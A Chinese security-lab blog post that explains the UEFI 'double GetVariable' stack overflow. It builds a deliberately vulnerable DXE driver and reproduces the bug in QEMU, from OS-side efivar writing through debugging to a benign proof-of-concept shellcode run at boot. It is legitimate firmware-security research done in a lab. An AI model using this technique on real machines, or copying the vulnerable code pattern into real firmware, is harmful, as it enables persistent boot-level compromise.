#  从OS到BIOS SMM

原创 r0  [ 联想全球安全实验室 ](javascript:void\(0\);)

**联想全球安全实验室** ![]()

微信号 gh_bfd408ab01d7

功能介绍 为联想产品提供安全保障

____

___发表于_

**点击蓝字 关注我们**

![]()

  

 **从OS到BIOS SMM**

 **  
**

当计算机电源被打开时，BIOS首先开始运行，BIOS负责加载并启动操作系统的加载模块，如Windows系统下的winload.efi，然后winload.efi才会加载操作系统。可以说，BIOS的安全性关乎整台计算机的安全性，在Windows系统加入CFG、CFI和各种内核漏洞缓解的武装下，BIOS漏洞可能会成为rootkit驻留的阿喀琉斯之踵。本文将以uefi中double
GetVariable类型漏洞为例，在qemu中模拟并调试这一漏洞。

![]()

 **Part.01**

 **漏洞原理**

  

GetVariable的功能是获取NVRAM中VariableName的值，把可能获取到的值拷贝到Data参数中，函数声明：

  *   *   *   *   *   *   *   *   * 

    
    
    typedefEFI_STATUS(EFIAPI *EFI_GET_VARIABLE)(  IN     CHAR16                      *VariableName,  IN     EFI_GUID                    *VendorGuid,  OUT    UINT32                      *Attributes     OPTIONAL,  IN OUT UINTN                       *DataSize,  OUT    VOID                        *Data           OPTIONAL  );

在PeiGetVariable函数定义的地方有这么一句说明：

  *   *   *   * 

    
    
      Read the specified variable from the UEFI variable store. If the Data  buffer is too small to hold the contents of the variable, the error  EFI_BUFFER_TOO_SMALL is returned and DataSize is set to the required buffer  size to obtain the data.

这里重点是后边一句，GetVariable会在Data参数的内存大小不够存储NVRAM中获取的值时，返回错误EFI_BUFFER_TOO_SMALL并把DataSize参数设置为请求的内存大小。GetVariable更新DataSize参数这个行为可能是BIOS开发人员容易忽视的一个非预期行为，导致开发人员会写出形如如下的漏洞代码：

  *   *   * 

    
    
    UINTN size = xxx;gRT->GetVariable(L"Var_abc", &Guid, 0, &size, &buf);gRT->GetVariable(L"Var_abc", &Guid, 0, &size, &buf);

即在两次调用GetVariable时，VariableName相同且DataSize参数没有被重新初始化。这样的代码会导致栈溢出的发生，原因如下。

gRT->GetVariable实现在/edk2/MdeModulePkg/Universal/Variable/RuntimeDxe/Variable.c，关键代码如下：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    EFI_STATUSEFIAPIVariableServiceGetVariable (  IN      CHAR16    *VariableName,  IN      EFI_GUID  *VendorGuid,  OUT     UINT32    *Attributes OPTIONAL,  IN OUT  UINTN     *DataSize,  OUT     VOID      *Data OPTIONAL  ){...  Status = FindVariable (VariableName, VendorGuid, &Variable, &mVariableModuleGlobal->VariableGlobal, FALSE);   //[1]...  VarDataSize = DataSizeOfVariable (Variable.CurrPtr, mVariableModuleGlobal->VariableGlobal.AuthFormat);    //[2]  ASSERT (VarDataSize != 0);  
      if (*DataSize >= VarDataSize) {   //[3]    if (Data == NULL) {      Status = EFI_INVALID_PARAMETER;      goto Done;    }  
        CopyMem (Data, GetVariableDataPtr (Variable.CurrPtr, mVariableModuleGlobal->VariableGlobal.AuthFormat), VarDataSize);   //[xxx]  
        *DataSize = VarDataSize;    UpdateVariableInfo (VariableName, VendorGuid, Variable.Volatile, TRUE, FALSE, FALSE, FALSE, &gVariableInfo);  
        Status = EFI_SUCCESS;    goto Done;  } else {  //[4]    *DataSize = VarDataSize;    Status    = EFI_BUFFER_TOO_SMALL;    goto Done;  }  
    Done:  if ((Status == EFI_SUCCESS) || (Status == EFI_BUFFER_TOO_SMALL)) {    if ((Attributes != NULL) && (Variable.CurrPtr != NULL)) {      *Attributes = Variable.CurrPtr->Attributes;    }  }...}

主要做了这么几件事:

[1]遍历NVRAM中存储Variable的内存，根据VariableName、VendorGuid匹配变量，返回遍历匹配结果并把可能获取到的值存储到VARIABLE_POINTER_TRACK
Variable中。

[2]获取Variable.CurrPtr结构体中存储的DataSize值，记VarDataSize。

  *   *   *   *   *   *   *   *   * 

    
    
    AUTHENTICATED_VARIABLE_HEADER  *AuthVariable;AuthVariable = (AUTHENTICATED_VARIABLE_HEADER *)Variable;if (AuthFormat) {...    return (UINTN)AuthVariable->DataSize;  } else {...    return (UINTN)Variable->DataSize;  }

[3]如果GetVariable的参数DataSize大于NVRAM中获取到的变量的DataSize(即[2]中的VarDataSize)，[xxx]处把VarDataSize长度的Variable.CurrPtr内容拷贝到Data内存中，并且在boot阶段调用UpdateVariableInfo。

[4]如果GetVariable的参数DataSize小于NVRAM中获取到的变量的DataSize(即[2]中的VarDataSize)，更新GetVariable的参数DataSize为VarDataSize，并返回错误码EFI_BUFFER_TOO_SMALL。

这里的问题在于，VarDataSize是攻击者可控的，攻击者可以通过设置其有权限访问的VariableName的内容，从而改变内容的长度VarDataSize。例如形如如下的DXE
Driver代码：

  *   *   * 

    
    
    UINTN size = 32;gRT->GetVariable(L"Var_abc", &Guid, 0, &size, &buf);    //[5]gRT->GetVariable(L"Var_abc", &Guid, 0, &size, &buf);    //[6]

这里假设攻击者可以访问并改变Var_abc的内容，攻击者把Var_abc的内容的长度设置为100。此时[5]处GetVariable的DataSize=32，[2]处VarDataSize为攻击者设置的100，DataSize<vardatasize执行[4]，更新datasize为100；[6]处getvariable的datasize为[5]执行后更新的值100，[2]处vardatasize依旧为100，执行[3]的代码，[xxx]处拷贝vardatasize长度的nvram中存储的variablename内容到栈里的data内存中，这里会栈溢出。

这里的攻击路径是：攻击者改变Var_abc内容 => 计算机重启 => BOOT阶段的DXE Driver执行，形如[5]、[6]的漏洞代码被执行 =>
漏洞触发，攻击者可以劫持BIOS BOOT执行流。

![]()

  

![]()

 **Part.02**

 **漏洞复现**

  

因为我们要从OS触发这个漏洞，所以漏洞复现需要用EDK2编译一个可以加载操作系统的镜像OVMF.fd。鉴于EDK2编译环境配置容易出现各种各样的问题，所以我一般是用docker镜像去编译edk2，dockerfile：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    FROM --platform=linux/amd64 ubuntu:18.04WORKDIR /tianoRUN apt update && apt install -y \        bc \        bison \        build-essential \        cpio \        flex \        libelf-dev \        libncurses-dev \        libssl-dev \        vim-tiny \        zsh\        wget\        nasm iasl uuid-dev\        pythonRUN useradd -u 1001 -m dev && chown dev:dev /tianoUSER devRUN mkdir edk2 && \    wget https://github.com/tianocore/edk2/releases/download/vUDK2017/edk2-vUDK2017.tar.gz&& \    tar xvf edk2-vUDK2017.tar.gz --strip-components=1 -C ./edk2 &&\    make -C edk2/BaseTools \

写一个有漏洞的DXE Driver代码，VulnDriver.c：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <Uefi.h>#include <Library/DebugLib.h>#include <Library/UefiRuntimeServicesTableLib.h>  
    EFI_GUID VulnGuid = { 0xa0fa115f, 0xc880, 0x4c7c, { 0x95, 0xee, 0x91, 0x30, 0x3d, 0xeb, 0xf4, 0xd1 } };  
    EFI_STATUSEFIAPIVulnDriverEntryPoint (  IN EFI_HANDLE        ImageHandle,  IN EFI_SYSTEM_TABLE  *SystemTable  ){  CHAR16 buf[16];  UINTN size = 32;  
      DEBUG((DEBUG_INFO, "Running VulnDriver now!\n"));  gRT->GetVariable(L"VulnVar", &VulnGuid, 0, &size, &buf);  
      DEBUG((DEBUG_INFO, "Got VulnVar variable. size is now %d\n", size));  gRT->GetVariable(L"VulnVar", &VulnGuid, 0, &size, &buf);  
      return EFI_SUCCESS;}

 VulnDriver.inf：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    [Defines]  INF_VERSION    = 0x00010005  BASE_NAME      = VulnDriver  FILE_GUID      = A0FA115F-C880-4C7C-95EE-91303DEBF4D1  MODULE_TYPE    = UEFI_DRIVER  VERSION_STRING = 1.0  ENTRY_POINT    = VulnDriverEntryPoint  
    [Sources]  VulnDriver.c  
    [Packages]  MdePkg/MdePkg.dec  
    [LibraryClasses]  UefiDriverEntryPoint  DebugLib  UefiRuntimeServicesTableLib

在docker中创建/tiano/edk2/OvmfPkg/VulnDriver/src目录，并把VulnDriver.c和VulnDriver.inf放到创建的目录下。这里方便的做法是在本地创建一个目录/src，把上述两个文件放到src目录里，然后使用docker启动命令-
v映射本地目录到docker目录中。如:-v$(pwd):/tiano/edk2/OvmfPkg/VulnDriver。

修改docker/映射本地文件/tiano/edk2/Conf/target.txt，ACTIVE_PLATFORM的值改为OvmfPkg/OvmfPkgX64.dsc，TARGET的值改为DEBUG。

修改docker/映射本地文件/tiano/edk2/OvmfPkg/OvmfPkgX64.dsc，在文件最后添加一行：OvmfPkg/VulnDriver/src/VulnDriver.inf

修改docker/映射本地文件/tiano/edk2/OvmfPkg/OvmfPkgX64.fdf，在[FV.DXEFV]段最后添加一行:INF
OvmfPkg/VulnDriver/src/VulnDriver.inf

修改/添加完如上文件后，启动docker编译，我这里的启动命令是：

  * 

    
    
    sudo docker run -v$(pwd):/tiano/edk2/OvmfPkg/VulnDriver -v$(pwd)/compile.sh:/tiano/compile.sh -v$(pwd)/target.txt:/tiano/edk2/Conf/target.txt -v$(pwd)/OvmfPkgX64.dsc:/tiano/edk2/OvmfPkg/OvmfPkgX64.dsc -v$(pwd)/OvmfPkgX64.fdf:/tiano/edk2/OvmfPkg/OvmfPkgX64.fdf -it edk2 /bin/bash

在docker里执行compile.sh：

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #!/bin/bashecho "BEGIN COMPILE"export WORKSPACE=/tianoexport PACKAGES_PATH=$WORKSPACE/edk2cd /tiano/edk2source edksetup.shbuild -t GCC5 -a X64 -p OvmfPkg/OvmfPkgX64.dsc  
    #copy VulnDriver.efi and VulnDriver.efi's debug symbol cp /tiano/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd /tiano/edk2/OvmfPkg/VulnDriver/bin/cp /tiano/Build/OvmfX64/DEBUG_GCC5/X64/VulnDriver.debug /tiano/edk2/OvmfPkg/VulnDriver/bin/cp /tiano/Build/OvmfX64/DEBUG_GCC5/X64/VulnDriver.efi /tiano/edk2/OvmfPkg/VulnDriver/bin/

顺利的话，在/bin目录会有编译好的OVMF.fd，这个文件就是我们加载操作系统复现漏洞要用的BIOS。

下面是用OVMF.fd启动操作系统，我这里是用的参考链接中给出的镜像下载地址https://people.debian.org/~gio/dqib/
，amd64-pc。

下载好镜像后用qemu启动[7]：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #!/bin/shqemu-system-x86_64 \    -machine q35 \    -cpu Nehalem \    -m 1G \    -drive file=image.qcow2 \    -device e1000,netdev=net \    -netdev user,id=net,hostfwd=tcp::2222-:22 \    -kernel kernel \    -initrd initrd \    -nographic \    -append "root=LABEL=rootfs console=ttyS0" \    -debugcon file:debug.log \    -global isa-debugcon.iobase=0x402 \    -pflash ./OVMF.fd \#    -s -S

![]()

  

![]()

 **Part.03**

 **漏洞调试**

  

调试可以把qemu启动命令[7]中的最后一行注释删掉，这样在启动qemu后用gdb附加target remote
localhost:1234，可以断在BIOS执行的第一条指令。

由于[7]qemu启动命令把debug信息输出到了debug.log，可以打开debug.log搜索字符串"VulnDriver"找到VulnDriver.efi加载的地址，由于BIOS
BOOT阶段没有ASLR机制，所以这个efi每次加载的地址都是同一个，我这里是0x0003ECA3000。

  *   *   *   *   *   * 

    
    
    Loading driver at 0x0003ECA3000 EntryPoint=0x0003ECA3EAF VulnDriver.efiInstallProtocolInterface: BC62157E-3E33-4FEC-9920-2D3B36D750DF 3F580E18ProtectUefiImageCommon - 0x3F580540  - 0x000000003ECA3000 - 0x00000000000017C0Running VulnDriver now!Got VulnVar variable. size is now 32

这里在ida里找到VulnDriver.efi的ModuleEntryPoint的偏移：

  *   *   *   *   *   *   *   *   * 

    
    
    .text:0000000000000EAF ; EFI_STATUS __fastcall ModuleEntryPoint(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable).text:0000000000000EAF                 public _ModuleEntryPoint.text:0000000000000EAF _ModuleEntryPoint proc near             ; DATA XREF: HEADER:00000000000000A8↑o.text:0000000000000EAF.text:0000000000000EAF Data            = qword ptr -58h.text:0000000000000EAF DataSize        = qword ptr -40h.text:0000000000000EAF var_38          = byte ptr -38h.text:0000000000000EAF.text:0000000000000EAF                 push    rsi

在gdb里断b \\*(0x0003ECA3000+0xEAF)就可以在VulnDriver.efi加载的地方断下来了。

因为我们要从OS触发这个漏洞，所以这里先正常进入操作系统。

UEFI加载的Linux系统，efivars通常保存在/sys/firmware/efi/efivars目录，每个efivar为一个文件，文件名为VariableName-
VariableGuid，如Lang-8be4df61-93ca-11d2-aa0d-00e098032b8c，由此可以推算出触发VulnDriver.c漏洞的VariableName为VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1。

创建文件：

  * 

    
    
    touch /sys/firmware/efi/efivars/VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1

为了不损坏系统，Linux会给未知的UEFI
variable文件添加"immutable"属性来保护文件不被随意更改，这里要修改VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1的内容需要去掉这一属性：

  * 

    
    
    chattr -i /sys/firmware/efi/efivars/VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1

还有一点需要注意的是，需要修改/efivars里的文件属性，使其在os runtime阶段和boot阶段都可以被访问，Linux在UEFI
variable的开头32位以小端序存储这一属性，这一属性在不同的Linux发行版中标志位可能不同，在使用的镜像中这个标志位被定义为：

  *   *   * 

    
    
    #define EFI_VARIABLE_NON_VOLATILE 0x00000001#define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002#define EFI_VARIABLE_RUNTIME_ACCESS 0x00000004

所以这里需要设置UEFI variable的前32位为0x1|0x2|0x4=0x7。

先用一段长的payload填充UEFI variable，payload可以用pwntools的cyclic生成一段：

  * 

    
    
    perl -e 'print("\x07\x00\x00\x00". "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa")' >> poc

拷贝到/sys/firmware/efi/efivars/VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1：

  * 

    
    
    cp ./poc /sys/firmware/efi/efivars/VulnVar-a0fa115f-c880-4c7c-95ee-91303debf4d1

重启会发现漏洞触发并崩溃在BIOS的VulnDriver.efi里。以下内容探讨这个类型漏洞的危害。

如下是gRT->GetVariable的汇编代码，可以看到GetVariable的前四个参数VariableName、VendorGuid、Attributes、DataSize都是根据x64调用约定用寄存器保存的，而用来保存NVRAM中VariableName值的Data[8]是放到栈里的，所以如果最终Data内存发生溢出的话，VulnDriver.efi(调用gRT->GetVariable的代码，而不是edk2中)的栈会发生溢出，这里也不是堆溢出。

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    .text:0000000000000F8E                 mov     rax, cs:gRT.text:0000000000000F95                 mov     r9, rbx         ; DataSize.text:0000000000000F98                 mov     [rsp+78h+Data], rsi ; Data   [8].text:0000000000000F9D                 xor     r8d, r8d        ; Attributes.text:0000000000000FA0                 lea     rdx, VendorGuid ; VendorGuid.text:0000000000000FA7                 lea     rcx, VariableName ; VariableName.text:0000000000000FAE                 call    [rax+EFI_RUNTIME_SERVICES.GetVariable] ; gRT->GetVariable().text:0000000000000FAE                                         ; EFI_STATUS(EFIAPI * EFI_GET_VARIABLE) (IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data).text:0000000000000FAE                                         ; VariableName   A Null-terminated string that is the name of the vendor's variable..text:0000000000000FAE                                         ; VendorGuid     A unique identifier for the vendor..text:0000000000000FAE                                         ; Attributes     If not NULL, a pointer to the memory location to return the attributes bitmask for the variable..text:0000000000000FAE                                         ; DataSize       On input, the size in bytes of the return Data buffer. On output the size of data returned in Data..text:0000000000000FAE                                         ; Data           The buffer to return the contents of the variable.

由于[8]中rsi保存Data内容，在VulnDriver.efi第二次调用GetVariable后查看rsi的内容[9]：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    pwndbg> x/20xg $rsi0x3ff00cc0:  0x6161616261616161  0x61616164616161630x3ff00cd0:  0x6161616661616165  0x61616168616161670x3ff00ce0:  0x6161616a61616169  0x6161616c6161616b0x3ff00cf0:  0x6161616e6161616d  0x616161706161616f0x3ff00d00:  0x6161617261616171  0x61616174616161730x3ff00d10:  0x6161617661616175  0x61616178616161770x3ff00d20:  0x0000000061616179  0x000000003fa0d7300x3ff00d30:  0x0000000000000000  0x000000003fa0d7180x3ff00d40:  0x000000003ff1a80c  0x000000003ff1fec00x3ff00d50:  0x000000003fa0d701  0x000000003fa0d701pwndbg> p $rbp$1 = (void *) 0x3ff1f020pwndbg> p $rsp$2 = (void *) 0x3ff00c80

此时$rsi为设置的payload的内容，$rsi在$rsp、$rbp之间，为栈内存，印证了我们之前的推理。

这里根据第二次执行完GetVariable的指令[10]，"add rsp,0x68;pop x;pop
x;ret"；或者根据qemu崩溃时的eip，可以算出来栈溢出的ret
addr保存在0x3ff00c80+0x68+0x8+0x8=0x3ff00cf8，为0x616161706161616f。

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    .text:0000000000000FE7                 call    [rax+EFI_RUNTIME_SERVICES.GetVariable] ; gRT->GetVariable().text:0000000000000FE7                                         ; EFI_STATUS(EFIAPI * EFI_GET_VARIABLE) (IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data).text:0000000000000FE7                                         ; VariableName   A Null-terminated string that is the name of the vendor's variable..text:0000000000000FE7                                         ; VendorGuid     A unique identifier for the vendor..text:0000000000000FE7                                         ; Attributes     If not NULL, a pointer to the memory location to return the attributes bitmask for the variable..text:0000000000000FE7                                         ; DataSize       On input, the size in bytes of the return Data buffer. On output the size of data returned in Data..text:0000000000000FE7                                         ; Data           The buffer to return the contents of the variable..text:0000000000000FEA                 add     rsp, 68h //[10].text:0000000000000FEE                 xor     eax, eax.text:0000000000000FF0                 pop     rbx.text:0000000000000FF1                 pop     rsi.text:0000000000000FF2                 retn

由于boot阶段没有aslr机制，所以重新使用之前编译的OVMF.fd替换现在NVRAM被更改后的，并更改payload为：

  * 

    
    
    perl -e 'print("\x07\x00\x00\x00". "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"."\x00\x0d\xf0\x3f\x00\x00\x00\x00"."\x90\x90\x90\xb8\x0d\xf0\xad\xba")' > poc

这段payload为padding + ret addr +
shellcode。由于boot阶段没有nx机制，所以这里可以直接在栈内存里写shellcode并覆盖ret
addr跳转到shellcode地址执行；这段payload中ret addr为[9]中得到的保存Data的栈地址，由于前面已经计算得出保存ret
addr的地址为0x3ff00cf8，所以这里直接在ret
addr之后写shellcode，即0x3ff00d00。这里shellcode为"nop;nop;nop;mov rax,0xbaadf00d"。

重启并调试发现在boot阶段成功执行了我们的shellcode：

![]()

  

![]()

  

![]()

 **Part.04**

 **总结**

  

这篇文章我们复现并成功证明了BIOS的double
GetVariable类型漏洞可以被攻击者劫持boot执行流。联想重视并保护用户的计算机安全，我们针对联想的BIOS固件及客户端软件的漏洞进行了长期研究和深入挖掘，以从根本上提高产品的安全性。

![]()

  

  

 **参考链接：**

https://margin.re/2023/09/emulating-and-exploiting-uefi-firmware/

  

  

 **往期精彩合集**

  

  

● [A Day in the Life of a Cyber Threat Analyst
网络威胁分析员的一天](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489553&idx=1&sn=cfd912f10ad73642c58317aa41ac17fa&chksm=fc1ffe59cb68774fa65d179356d99220da76830c9e43255f3019fa68738e5152ccbfe6a29305&scene=21#wechat_redirect)

● [LLM Prompt
安全](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489523&idx=1&sn=0017eabe303b40221c6b6215bd00f1ee&chksm=fc1ff1bbcb6878adc63c43af134827f406622189835f97c3438b41dfa7c62386305072ebef6f&scene=21#wechat_redirect)

●
[在没有ROOT的手机上抓HTTPS](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489432&idx=1&sn=afe992cf44d1d4b0ad4b011cc030aa22&chksm=fc1ff1d0cb6878c65030b60a4e0332606017b0387fbe3a45ee1e3f749e86915c2609bfa34965&scene=21#wechat_redirect)

●
[项目管理中的高效会议秘籍](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489418&idx=1&sn=63218b72022257be7d9cf7d1c1854336&chksm=fc1ff1c2cb6878d4100977ef450ea43f815655b52091dc951694c0b3621c367436b9f662a6b3&scene=21#wechat_redirect)

●
[开源安全：构建数字未来的坚固堡垒](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489385&idx=1&sn=7eabda7c7e1fa9f7787c96c0dbd30faa&chksm=fc1ff121cb687837f94155c6bc1666a24bd81cd196f1aa0d9943eb50389381cfb64eb859dc27&scene=21#wechat_redirect)

●
[Deepfake人工智能时代的挑战与机遇](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489337&idx=1&sn=8ac25ff48c8e38ac3c846c37ffca8d13&chksm=fc1ff171cb6878674dd97a7c48f48e66c4015c4a1779844bae9fb9aa2b9fd50ed220cfa1ec61&scene=21#wechat_redirect)

●
[DPAPI机制解析](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489316&idx=1&sn=f2e27c93578c411a2bfa0b75e55b043d&chksm=fc1ff16ccb68787aa48e018084e74aa70633ced55d3dcabdca4af62fd29c8eec3064ece38e29&scene=21#wechat_redirect)

●
[移动APP隐私安全，做到这些就够了](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489276&idx=1&sn=2f9becce5562d2aa6037753cc9269e34&chksm=fc1ff0b4cb6879a2fda3f61915a161be6f4136eeaad8e3e242ac550a1f2906196a19a827a930&scene=21#wechat_redirect)

●
[PE文件格式](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489250&idx=1&sn=3a31b7c4d343b940823b9241f0803ffc&chksm=fc1ff0aacb6879bc2367a4f8f697cd5baa1d804303e0e847fe3f02a00049ced79af1a71334e5&scene=21#wechat_redirect)

●
[车联网安全思考](http://mp.weixin.qq.com/s?__biz=MzU1ODk1MzI1NQ==&mid=2247489185&idx=1&sn=1e69293ac76501bdffd923ecfe98d4a5&chksm=fc1ff0e9cb6879ffb6bda65458e2928b8ad993d00c7c85faf8066fc11abc62f9088bd6a921f6&scene=21#wechat_redirect)

  

 **长**

 **按**

 **关**

 **注**

联想GIC全球安全实验室（中国）

chinaseclab@lenovo.com

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 从OS到BIOS SMM

原创 r0  [ 联想全球安全实验室 ](javascript:void\(0\);)

轻触阅读原文

![]()

联想全球安全实验室

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

